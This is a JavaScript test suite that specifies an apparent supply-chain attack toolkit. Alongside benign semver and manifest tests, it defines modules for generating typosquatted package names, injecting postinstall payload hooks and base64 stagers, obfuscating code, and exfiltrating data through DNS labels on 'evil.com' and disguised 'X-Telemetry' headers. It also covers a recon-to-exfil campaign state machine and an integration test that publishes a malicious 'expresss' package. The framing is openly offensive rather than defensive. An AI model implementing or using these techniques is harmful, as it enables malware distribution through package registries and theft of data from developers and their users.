export async function runSupplyChainAttackProbes({call, test, eq}) {
  // === manifest.mjs: package manifest parsing ===

  await test('parsePackageJson extracts name and version', async () => {
    const pkg = JSON.stringify({name: 'lodash', version: '4.17.21', dependencies: {'express': '^4.18.0'}});
    const r = await call('src/manifest.mjs', 'parsePackageJson', [pkg]);
    eq(r.name, 'lodash');
    eq(r.version, '4.17.21');
  });

  await test('parsePackageJson extracts dependencies and devDependencies separately', async () => {
    const pkg = JSON.stringify({
      name: 'app', version: '1.0.0',
      dependencies: {'express': '^4.18.0', 'lodash': '~4.17.0'},
      devDependencies: {'jest': '^29.0.0'}
    });
    const r = await call('src/manifest.mjs', 'parsePackageJson', [pkg]);
    eq(r.dependencies.length, 2);
    eq(r.devDependencies.length, 1);
    eq(r.dependencies[0].name, 'express');
    eq(r.dependencies[0].range, '^4.18.0');
  });

  await test('parsePackageJson throws on malformed JSON', async () => {
    let threw = false;
    try { await call('src/manifest.mjs', 'parsePackageJson', ['not json{{{']); } catch { threw = true; }
    eq(threw, true);
  });

  await test('parsePackageJson handles missing dependencies gracefully', async () => {
    const pkg = JSON.stringify({name: 'bare', version: '0.0.1'});
    const r = await call('src/manifest.mjs', 'parsePackageJson', [pkg]);
    eq(r.dependencies.length, 0);
    eq(r.devDependencies.length, 0);
  });

  await test('parseSetupCfg extracts install_requires', async () => {
    const cfg = '[options]\ninstall_requires =\n    requests>=2.28\n    click~=8.0\n    pyyaml';
    const r = await call('src/manifest.mjs', 'parseSetupCfg', [cfg]);
    eq(r.length, 3);
    eq(r[0].name, 'requests');
    eq(r[0].range, '>=2.28');
    eq(r[2].name, 'pyyaml');
    eq(r[2].range, '*');
  });

  await test('buildDepTree constructs tree from flat list', async () => {
    const pkgs = {
      'app': {deps: {'lib-a': '^1.0.0', 'lib-b': '^2.0.0'}},
      'lib-a': {deps: {'lib-c': '^3.0.0'}},
      'lib-b': {deps: {'lib-c': '^3.1.0'}},
      'lib-c': {deps: {}}
    };
    const tree = await call('src/manifest.mjs', 'buildDepTree', ['app', pkgs]);
    eq(tree.name, 'app');
    eq(tree.children.length, 2);
    const libA = tree.children.find(c => c.name === 'lib-a');
    eq(libA.children.length, 1);
    eq(libA.children[0].name, 'lib-c');
  });

  await test('buildDepTree detects circular dependency', async () => {
    const pkgs = {
      'a': {deps: {'b': '*'}},
      'b': {deps: {'a': '*'}}
    };
    let threw = false;
    try { await call('src/manifest.mjs', 'buildDepTree', ['a', pkgs]); } catch { threw = true; }
    eq(threw, true);
  });

  // === resolver.mjs: semver resolution ===

  await test('parseSemver extracts major.minor.patch', async () => {
    const v = await call('src/resolver.mjs', 'parseSemver', ['4.17.21']);
    eq(v.major, 4);
    eq(v.minor, 17);
    eq(v.patch, 21);
  });

  await test('parseSemver handles prerelease', async () => {
    const v = await call('src/resolver.mjs', 'parseSemver', ['1.0.0-beta.1']);
    eq(v.major, 1);
    eq(v.prerelease, 'beta.1');
  });

  await test('parseSemver rejects non-semver', async () => {
    let threw = false;
    try { await call('src/resolver.mjs', 'parseSemver', ['not.a.version.string']); } catch { threw = true; }
    eq(threw, true);
  });

  await test('compareSemver orders correctly', async () => {
    const r1 = await call('src/resolver.mjs', 'compareSemver', ['1.2.3', '1.2.4']);
    eq(r1 < 0, true);
    const r2 = await call('src/resolver.mjs', 'compareSemver', ['2.0.0', '1.99.99']);
    eq(r2 > 0, true);
    const r3 = await call('src/resolver.mjs', 'compareSemver', ['1.0.0', '1.0.0']);
    eq(r3, 0);
  });

  await test('compareSemver 2.10.0 > 2.9.0 (not string comparison)', async () => {
    const r = await call('src/resolver.mjs', 'compareSemver', ['2.10.0', '2.9.0']);
    eq(r > 0, true);
  });

  await test('satisfies caret range ^4.17.0', async () => {
    eq(await call('src/resolver.mjs', 'satisfies', ['4.17.21', '^4.17.0']), true);
    eq(await call('src/resolver.mjs', 'satisfies', ['4.18.0', '^4.17.0']), true);
    eq(await call('src/resolver.mjs', 'satisfies', ['5.0.0', '^4.17.0']), false);
    eq(await call('src/resolver.mjs', 'satisfies', ['4.16.0', '^4.17.0']), false);
  });

  await test('satisfies tilde range ~4.17.0', async () => {
    eq(await call('src/resolver.mjs', 'satisfies', ['4.17.5', '~4.17.0']), true);
    eq(await call('src/resolver.mjs', 'satisfies', ['4.18.0', '~4.17.0']), false);
  });

  await test('satisfies exact version', async () => {
    eq(await call('src/resolver.mjs', 'satisfies', ['1.0.0', '1.0.0']), true);
    eq(await call('src/resolver.mjs', 'satisfies', ['1.0.1', '1.0.0']), false);
  });

  await test('satisfies >= range', async () => {
    eq(await call('src/resolver.mjs', 'satisfies', ['2.0.0', '>=1.5.0']), true);
    eq(await call('src/resolver.mjs', 'satisfies', ['1.4.9', '>=1.5.0']), false);
  });

  await test('satisfies wildcard *', async () => {
    eq(await call('src/resolver.mjs', 'satisfies', ['99.99.99', '*']), true);
  });

  await test('resolve picks highest matching version', async () => {
    const versions = ['1.0.0', '1.1.0', '1.2.0', '2.0.0'];
    const r = await call('src/resolver.mjs', 'resolve', ['^1.0.0', versions]);
    eq(r, '1.2.0');
  });

  await test('resolve returns null when no match', async () => {
    const versions = ['1.0.0', '1.1.0'];
    const r = await call('src/resolver.mjs', 'resolve', ['^2.0.0', versions]);
    eq(r, null);
  });

  await test('resolveAll returns topological install order', async () => {
    const graph = {
      'app': {range: '*', deps: {'lib-a': '^1.0.0', 'lib-b': '^2.0.0'}},
      'lib-a': {range: '^1.0.0', deps: {'lib-c': '^3.0.0'}},
      'lib-b': {range: '^2.0.0', deps: {'lib-c': '^3.0.0'}},
      'lib-c': {range: '^3.0.0', deps: {}}
    };
    const versions = {'lib-a': ['1.0.0', '1.1.0'], 'lib-b': ['2.0.0'], 'lib-c': ['3.0.0', '3.1.0']};
    const order = await call('src/resolver.mjs', 'resolveAll', [graph, versions]);
    const idxC = order.findIndex(p => p.name === 'lib-c');
    const idxA = order.findIndex(p => p.name === 'lib-a');
    const idxB = order.findIndex(p => p.name === 'lib-b');
    eq(idxC < idxA, true);
    eq(idxC < idxB, true);
  });

  // === typosquat.mjs: typosquatting detection ===

  await test('levenshtein known distances', async () => {
    eq(await call('src/typosquat.mjs', 'levenshtein', ['kitten', 'sitting']), 3);
    eq(await call('src/typosquat.mjs', 'levenshtein', ['', 'abc']), 3);
    eq(await call('src/typosquat.mjs', 'levenshtein', ['abc', 'abc']), 0);
    eq(await call('src/typosquat.mjs', 'levenshtein', ['abc', '']), 3);
  });

  await test('levenshtein is symmetric', async () => {
    const d1 = await call('src/typosquat.mjs', 'levenshtein', ['lodash', 'lodahs']);
    const d2 = await call('src/typosquat.mjs', 'levenshtein', ['lodahs', 'lodash']);
    eq(d1, d2);
  });

  await test('damerauLevenshtein counts transposition as 1', async () => {
    const r = await call('src/typosquat.mjs', 'damerauLevenshtein', ['ab', 'ba']);
    eq(r, 1);
    const lev = await call('src/typosquat.mjs', 'levenshtein', ['ab', 'ba']);
    eq(lev, 2);
  });

  await test('generateHomoglyphs replaces confusable chars', async () => {
    const r = await call('src/typosquat.mjs', 'generateHomoglyphs', ['lodash']);
    eq(r.length >= 1, true);
    eq(r.every(s => s !== 'lodash'), true);
    const hasLSub = r.some(s => s[0] !== 'l');
    const hasOSub = r.some(s => s[1] !== 'o');
    eq(hasLSub || hasOSub, true);
  });

  await test('generateTyposquats produces known variants', async () => {
    const r = await call('src/typosquat.mjs', 'generateTyposquats', ['express']);
    eq(r.length >= 5, true);
    const hasDeletion = r.some(s => s.length === 6);
    const hasSwap = r.some(s => s.length === 7 && s !== 'express');
    eq(hasDeletion || hasSwap, true);
  });

  await test('scoreRisk higher for distance 1 popular package', async () => {
    const s1 = await call('src/typosquat.mjs', 'scoreRisk', ['expresss', 'express', {downloads: 1000000}]);
    const s2 = await call('src/typosquat.mjs', 'scoreRisk', ['xyzzy', 'express', {downloads: 1000000}]);
    eq(s1 > s2, true);
  });

  await test('detectTyposquat flags close matches', async () => {
    const registry = ['express', 'lodash', 'react', 'axios'];
    const r = await call('src/typosquat.mjs', 'detectTyposquat', ['expresss', registry]);
    eq(r.isTyposquat, true);
    eq(r.target, 'express');
    eq(r.distance, 1);
  });

  await test('detectTyposquat returns false for legitimate names', async () => {
    const registry = ['express', 'lodash'];
    const r = await call('src/typosquat.mjs', 'detectTyposquat', ['my-unique-package', registry]);
    eq(r.isTyposquat, false);
  });

  // === inject.mjs: code injection ===

  await test('wrapExport wraps default export with interceptor', async () => {
    const code = 'export default function add(a, b) { return a + b; }';
    const r = await call('src/inject.mjs', 'wrapExport', [code, 'console.log("intercepted")']);
    eq(r.includes('console.log("intercepted")'), true);
    eq(r.includes('export default'), true);
  });

  await test('insertPreload injects at top of module', async () => {
    const code = 'const x = 1;\nexport default x;';
    const payload = 'globalThis.__loaded = true;';
    const r = await call('src/inject.mjs', 'insertPreload', [code, payload]);
    const lines = r.split('\n');
    eq(lines[0], payload);
  });

  await test('insertPostInstall adds to package.json scripts', async () => {
    const pkg = {name: 'target', version: '1.0.0', scripts: {test: 'jest'}};
    const r = await call('src/inject.mjs', 'insertPostInstall', [pkg, 'node payload.js']);
    eq(r.scripts.postinstall, 'node payload.js');
    eq(r.scripts.test, 'jest');
  });

  await test('insertPostInstall chains existing postinstall', async () => {
    const pkg = {name: 'target', version: '1.0.0', scripts: {postinstall: 'node setup.js'}};
    const r = await call('src/inject.mjs', 'insertPostInstall', [pkg, 'node payload.js']);
    eq(r.scripts.postinstall.includes('node setup.js'), true);
    eq(r.scripts.postinstall.includes('node payload.js'), true);
  });

  await test('generateStager creates base64-encoded payload', async () => {
    const r = await call('src/inject.mjs', 'generateStager', ['console.log("pwned")']);
    eq(r.includes('Buffer.from'), true);
    eq(r.includes('base64'), true);
    const b64 = Buffer.from('console.log("pwned")').toString('base64');
    eq(r.includes(b64), true);
  });

  // === registry.mjs: mock package registry ===

  await test('createRegistry returns empty registry', async () => {
    const r = await call('src/registry.mjs', 'createRegistry', []);
    eq(r.packages instanceof Object, true);
    eq(Object.keys(r.packages).length, 0);
  });

  await test('publish adds package version', async () => {
    let reg = await call('src/registry.mjs', 'createRegistry', []);
    reg = await call('src/registry.mjs', 'publish', [reg, {name: 'evil-pkg', version: '1.0.0', files: {'index.js': 'module.exports = 1'}}]);
    eq(reg.packages['evil-pkg'].versions.length, 1);
    eq(reg.packages['evil-pkg'].versions[0].version, '1.0.0');
  });

  await test('publish rejects duplicate version', async () => {
    let reg = await call('src/registry.mjs', 'createRegistry', []);
    reg = await call('src/registry.mjs', 'publish', [reg, {name: 'pkg', version: '1.0.0', files: {}}]);
    let threw = false;
    try { await call('src/registry.mjs', 'publish', [reg, {name: 'pkg', version: '1.0.0', files: {}}]); } catch { threw = true; }
    eq(threw, true);
  });

  await test('download returns specific version files', async () => {
    let reg = await call('src/registry.mjs', 'createRegistry', []);
    reg = await call('src/registry.mjs', 'publish', [reg, {name: 'pkg', version: '1.0.0', files: {'index.js': 'v1'}}]);
    reg = await call('src/registry.mjs', 'publish', [reg, {name: 'pkg', version: '2.0.0', files: {'index.js': 'v2'}}]);
    const r = await call('src/registry.mjs', 'download', [reg, 'pkg', '1.0.0']);
    eq(r.files['index.js'], 'v1');
  });

  await test('listVersions returns semver-sorted (not string-sorted)', async () => {
    let reg = await call('src/registry.mjs', 'createRegistry', []);
    reg = await call('src/registry.mjs', 'publish', [reg, {name: 'p', version: '1.9.0', files: {}}]);
    reg = await call('src/registry.mjs', 'publish', [reg, {name: 'p', version: '1.10.0', files: {}}]);
    reg = await call('src/registry.mjs', 'publish', [reg, {name: 'p', version: '2.0.0', files: {}}]);
    const versions = await call('src/registry.mjs', 'listVersions', [reg, 'p']);
    eq(versions[0], '1.9.0');
    eq(versions[1], '1.10.0');
    eq(versions[2], '2.0.0');
  });

  await test('search by substring', async () => {
    let reg = await call('src/registry.mjs', 'createRegistry', []);
    reg = await call('src/registry.mjs', 'publish', [reg, {name: 'express', version: '1.0.0', files: {}}]);
    reg = await call('src/registry.mjs', 'publish', [reg, {name: 'express-validator', version: '1.0.0', files: {}}]);
    reg = await call('src/registry.mjs', 'publish', [reg, {name: 'lodash', version: '1.0.0', files: {}}]);
    const r = await call('src/registry.mjs', 'search', [reg, 'express']);
    eq(r.length, 2);
  });

  // === obfuscate.mjs: code obfuscation ===

  await test('renameVars replaces identifiers consistently', async () => {
    const code = 'const secret = 42; return secret + secret;';
    const r = await call('src/obfuscate.mjs', 'renameVars', [code, {'secret': '_0x1a2b'}]);
    eq(r.includes('secret'), false);
    eq(r.includes('_0x1a2b'), true);
    const count = (r.match(/_0x1a2b/g) || []).length;
    eq(count, 3);
  });

  await test('hexEncodeStrings converts string literals', async () => {
    const r = await call('src/obfuscate.mjs', 'hexEncodeStrings', ['"hello"']);
    eq(r.includes('\\x68\\x65\\x6c\\x6c\\x6f'), true);
  });

  await test('hexEncodeStrings preserves non-string content', async () => {
    const r = await call('src/obfuscate.mjs', 'hexEncodeStrings', ['const x = 42; const s = "hi";']);
    eq(r.includes('const x = 42'), true);
    eq(r.includes('"hi"'), false);
  });

  await test('splitString breaks into char codes', async () => {
    const r = await call('src/obfuscate.mjs', 'splitString', ['AB']);
    eq(r.includes('String.fromCharCode'), true);
    eq(r.includes('65'), true);
    eq(r.includes('66'), true);
  });

  await test('obfuscate composes all transforms', async () => {
    const code = 'const password = "admin123";';
    const r = await call('src/obfuscate.mjs', 'obfuscate', [code]);
    eq(r.includes('password'), false);
    eq(r.includes('admin123'), false);
  });

  // === exfil.mjs: data exfiltration ===

  await test('chunkData splits with sequence numbers', async () => {
    const data = 'ABCDEFGHIJKLMNOP';
    const chunks = await call('src/exfil.mjs', 'chunkData', [data, {chunkSize: 4}]);
    eq(chunks.length, 4);
    eq(chunks[0].seq, 0);
    eq(chunks[0].data, 'ABCD');
    eq(chunks[3].seq, 3);
    eq(chunks[3].data, 'MNOP');
  });

  await test('chunkData handles non-even split', async () => {
    const chunks = await call('src/exfil.mjs', 'chunkData', ['ABCDE', {chunkSize: 3}]);
    eq(chunks.length, 2);
    eq(chunks[1].data, 'DE');
  });

  await test('encodeDnsLabels fits into valid DNS labels', async () => {
    const data = Buffer.from('secret data to exfiltrate');
    const labels = await call('src/exfil.mjs', 'encodeDnsLabels', [data, 'evil.com', {maxLabelLen: 16}]);
    eq(labels.length >= 1, true);
    for (const label of labels) {
      eq(label.endsWith('.evil.com'), true);
      const parts = label.replace('.evil.com', '').split('.');
      for (const part of parts) {
        eq(part.length <= 16, true);
      }
    }
  });

  await test('encodeHttpHeaders splits into custom headers', async () => {
    const data = 'a]'.repeat(50);
    const headers = await call('src/exfil.mjs', 'encodeHttpHeaders', [data, {prefix: 'X-Telemetry', maxValueLen: 32}]);
    eq(headers.length >= 2, true);
    eq(headers[0].name.startsWith('X-Telemetry-'), true);
    for (const h of headers) {
      eq(h.value.length <= 32, true);
    }
  });

  await test('reassemble reconstructs from out-of-order chunks', async () => {
    const chunks = [{seq: 2, data: 'GH'}, {seq: 0, data: 'ABCD'}, {seq: 1, data: 'EF'}];
    const r = await call('src/exfil.mjs', 'reassemble', [chunks]);
    eq(r, 'ABCDEFGH');
  });

  await test('reassemble throws on missing sequence', async () => {
    let threw = false;
    try { await call('src/exfil.mjs', 'reassemble', [[{seq: 0, data: 'A'}, {seq: 2, data: 'C'}]]); } catch { threw = true; }
    eq(threw, true);
  });

  await test('xorEncrypt round-trips', async () => {
    const key = 'secretkey';
    const encrypted = await call('src/exfil.mjs', 'xorEncrypt', ['hello world', key]);
    const decrypted = await call('src/exfil.mjs', 'xorEncrypt', [encrypted, key]);
    eq(decrypted, 'hello world');
  });

  // === campaign.mjs: multi-target campaign orchestration ===

  await test('createCampaign initializes in recon state', async () => {
    const c = await call('src/campaign.mjs', 'createCampaign', [{id: 'op-1', targets: ['pkg-a', 'pkg-b']}]);
    eq(c.state, 'recon');
    eq(c.targets.length, 2);
    eq(c.history.length, 0);
  });

  await test('advance recon→stage→deploy→persist→exfil', async () => {
    let c = await call('src/campaign.mjs', 'createCampaign', [{id: 'op-2', targets: ['t1']}]);
    c = await call('src/campaign.mjs', 'advance', [c, {now: 1000}]);
    eq(c.state, 'stage');
    c = await call('src/campaign.mjs', 'advance', [c, {now: 2000}]);
    eq(c.state, 'deploy');
    c = await call('src/campaign.mjs', 'advance', [c, {now: 3000}]);
    eq(c.state, 'persist');
    c = await call('src/campaign.mjs', 'advance', [c, {now: 4000}]);
    eq(c.state, 'exfil');
  });

  await test('advance throws past terminal state', async () => {
    let c = await call('src/campaign.mjs', 'createCampaign', [{id: 'op-3', targets: []}]);
    c = await call('src/campaign.mjs', 'advance', [c, {now: 1}]);
    c = await call('src/campaign.mjs', 'advance', [c, {now: 2}]);
    c = await call('src/campaign.mjs', 'advance', [c, {now: 3}]);
    c = await call('src/campaign.mjs', 'advance', [c, {now: 4}]);
    eq(c.state, 'exfil');
    let threw = false;
    try { await call('src/campaign.mjs', 'advance', [c, {now: 5}]); } catch { threw = true; }
    eq(threw, true);
  });

  await test('rollback returns to previous state', async () => {
    let c = await call('src/campaign.mjs', 'createCampaign', [{id: 'op-4', targets: ['t1']}]);
    c = await call('src/campaign.mjs', 'advance', [c, {now: 1}]);
    c = await call('src/campaign.mjs', 'advance', [c, {now: 2}]);
    eq(c.state, 'deploy');
    c = await call('src/campaign.mjs', 'rollback', [c, {now: 3}]);
    eq(c.state, 'stage');
  });

  await test('rollback from recon throws', async () => {
    const c = await call('src/campaign.mjs', 'createCampaign', [{id: 'op-5', targets: []}]);
    let threw = false;
    try { await call('src/campaign.mjs', 'rollback', [c, {now: 1}]); } catch { threw = true; }
    eq(threw, true);
  });

  await test('addTarget tracks per-target status', async () => {
    let c = await call('src/campaign.mjs', 'createCampaign', [{id: 'op-6', targets: ['t1']}]);
    c = await call('src/campaign.mjs', 'addTarget', [c, 't2', {now: 1}]);
    eq(c.targets.length, 2);
    eq(c.targets[1].id, 't2');
    eq(c.targets[1].status, 'pending');
  });

  await test('getTimeline returns sorted events', async () => {
    let c = await call('src/campaign.mjs', 'createCampaign', [{id: 'op-7', targets: ['t1']}]);
    c = await call('src/campaign.mjs', 'advance', [c, {now: 300}]);
    c = await call('src/campaign.mjs', 'advance', [c, {now: 100}]);
    const tl = await call('src/campaign.mjs', 'getTimeline', [c]);
    eq(tl.length, 2);
    eq(tl[0].timestamp <= tl[1].timestamp, true);
  });

  await test('advance does not mutate input', async () => {
    const c = await call('src/campaign.mjs', 'createCampaign', [{id: 'op-imm', targets: ['t1']}]);
    await call('src/campaign.mjs', 'advance', [c, {now: 1}], {immutable: true});
  });

  // === Cross-module integration ===

  await test('Parse manifest → resolve deps → check typosquats → publish to registry', async () => {
    const pkg = JSON.stringify({
      name: 'victim-app', version: '1.0.0',
      dependencies: {'expresss': '^4.0.0', 'lodash': '^4.17.0'}
    });
    const parsed = await call('src/manifest.mjs', 'parsePackageJson', [pkg]);
    eq(parsed.dependencies.length, 2);

    const registry = ['express', 'lodash', 'react'];
    const check = await call('src/typosquat.mjs', 'detectTyposquat', ['expresss', registry]);
    eq(check.isTyposquat, true);
    eq(check.target, 'express');

    let reg = await call('src/registry.mjs', 'createRegistry', []);
    reg = await call('src/registry.mjs', 'publish', [reg, {name: 'expresss', version: '4.18.0', files: {'index.js': 'malicious'}}]);
    const downloaded = await call('src/registry.mjs', 'download', [reg, 'expresss', '4.18.0']);
    eq(downloaded.files['index.js'], 'malicious');
  });

  await test('Inject payload → obfuscate → chunk for exfil → campaign advance', async () => {
    const payload = await call('src/inject.mjs', 'generateStager', ['fetch("https://evil.com")']);
    const obfuscated = await call('src/obfuscate.mjs', 'obfuscate', [payload]);
    eq(obfuscated.includes('fetch'), false);

    const chunks = await call('src/exfil.mjs', 'chunkData', [obfuscated, {chunkSize: 32}]);
    eq(chunks.length >= 1, true);
    eq(chunks[0].seq, 0);

    let campaign = await call('src/campaign.mjs', 'createCampaign', [{id: 'integration-test', targets: ['victim-app']}]);
    campaign = await call('src/campaign.mjs', 'advance', [campaign, {now: Date.now()}]);
    eq(campaign.state, 'stage');
  });

  await test('Full resolver pipeline: parse → build tree → resolve versions', async () => {
    const pkg = JSON.stringify({
      name: 'root', version: '1.0.0',
      dependencies: {'lib-a': '^1.0.0', 'lib-b': '^2.0.0'}
    });
    const parsed = await call('src/manifest.mjs', 'parsePackageJson', [pkg]);
    eq(parsed.dependencies.length, 2);

    const graph = {
      'root': {range: '*', deps: {'lib-a': '^1.0.0', 'lib-b': '^2.0.0'}},
      'lib-a': {range: '^1.0.0', deps: {}},
      'lib-b': {range: '^2.0.0', deps: {}}
    };
    const versions = {'lib-a': ['1.0.0', '1.1.0', '1.2.0'], 'lib-b': ['2.0.0', '2.1.0']};
    const order = await call('src/resolver.mjs', 'resolveAll', [graph, versions]);
    eq(order.length >= 2, true);
    const aResolved = order.find(p => p.name === 'lib-a');
    eq(aResolved.version, '1.2.0');
  });
}
